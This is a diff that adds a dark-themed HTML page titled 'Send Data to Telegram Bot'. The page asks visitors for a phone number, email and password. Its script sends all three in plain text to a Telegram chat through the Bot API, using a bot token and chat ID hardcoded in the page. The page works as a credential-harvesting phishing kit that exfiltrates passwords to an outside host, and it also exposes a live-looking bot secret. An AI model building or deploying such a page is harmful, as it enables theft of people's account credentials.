@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Send Data to Telegram Bot</title>
+<style>
+  /* Telegram Dark Background inspired */
+  body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background: #1c1c1c; /* dark background used in Telegram Dark mode */
+    background-image: radial-gradient(circle at top left, #272727, #1c1c1c 70%);
+    color: #e1e1e1;
+    margin: 0;
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+  }
+  .container {
+    background: #2c2c2c; /* slightly lighter dark container */
+    border-radius: 15px;
+    padding: 30px 40px;
+    max-width: 400px;
+    width: 100%;
+    box-shadow: 0 8px 20px rgba(0,0,0,0.9);
+  }
+  h1 {
+    text-align: center;
+    margin-bottom: 25px;
+    font-weight: 700;
+    letter-spacing: 1px;
+    color: #e1e1e1;
+  }
+  label {
+    display: block;
+    margin-bottom: 8px;
+    font-weight: 600;
+    color: #bbb;
+  }
+  input[type="tel"],
+  input[type="email"],
+  input[type="password"] {
+    width: 100%;
+    padding: 10px 14px;
+    margin-bottom: 20px;
+    border-radius: 8px;
+    border: none;
+    font-size: 16px;
+    outline: none;
+    background-color: #3a3a3a;
+    color: #e1e1e1;
+    transition: box-shadow 0.3s ease;
+  }
+  input::placeholder {
+    color: #999;
+  }
+  input[type="tel"]:focus,
+  input[type="email"]:focus,
+  input[type="password"]:focus {
+    box-shadow: 0 0 8px 2px #3787f0;
+    background-color: #2e2e2e;
+  }
+  button {
+    width: 100%;
+    padding: 12px 0;
+    background: #3787f0;
+    font-size: 18px;
+    font-weight: 600;
+    border: none;
+    border-radius: 10px;
+    color: #fff;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+  }
+  button:hover {
+    background: #256edb;
+  }
+  .message {
+    text-align: center;
+    margin-top: 18px;
+    font-weight: 600;
+  }
+  .error {
+    color: #ff6b6b;
+  }
+  .success {
+    color: #72d572;
+  }
+</style>
+</head>
+<body>
+  <div class="container">
+    <h1>Send Your Data</h1>
+    <form id="infoForm">
+      <label for="phone">Phone Number</label>
+      <input type="tel" id="phone" placeholder="Enter your phone number" required />
+      <label for="email">Email</label>
+      <input type="email" id="email" placeholder="Enter your email" required />
+      <label for="password">Password</label>
+      <input type="password" id="password" placeholder="Enter your password" required />
+      <button type="submit">Send👍</button>
+    </form>
+    <div class="message" id="message"></div>
+  </div>
+
+<script>
+  const form = document.getElementById('infoForm');
+  const messageDiv = document.getElementById('message');
+
+  // Telegram bot token and chat id to replace with your own
+  const telegramBotToken = '7622152443:AAHAtVJvAB0rf6HadrgGSpQrF_1iz-epK8s';
+  const telegramChatId = '-1002686858072';
+
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    messageDiv.textContent = '';
+    messageDiv.className = 'message';
+
+    const phone = document.getElementById('phone').value.trim();
+    const email = document.getElementById('email').value.trim();
+    const password = document.getElementById('password').value.trim();
+
+    if (!phone || !email || !password) {
+      messageDiv.textContent = 'Please fill all fields.';
+      messageDiv.classList.add('error');
+      return;
+    }
+
+    const textMessage = `New Data Received:%0APhone Number: ${encodeURIComponent(phone)}%0AEmail: ${encodeURIComponent(email)}%0APassword: ${encodeURIComponent(password)}`;
+
+    const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=${textMessage}`;
+
+    try {
+      const response = await fetch(telegramUrl, { method: 'GET' });
+      const data = await response.json();
+      if (data.ok) {
+        messageDiv.textContent = 'Data sent successfully!';
+        messageDiv.classList.add('success');
+        form.reset();
+      } else {
+        messageDiv.textContent = 'Failed to send data. Please check your token and chat ID.';
+        messageDiv.classList.add('error');
+      }
+    } catch (error) {
+      messageDiv.textContent = 'Error sending data. Please try again later.';
+      messageDiv.classList.add('error');
+      console.error('Telegram API error:', error);
+    }
+  });
+</script>
+</body>
+</html>
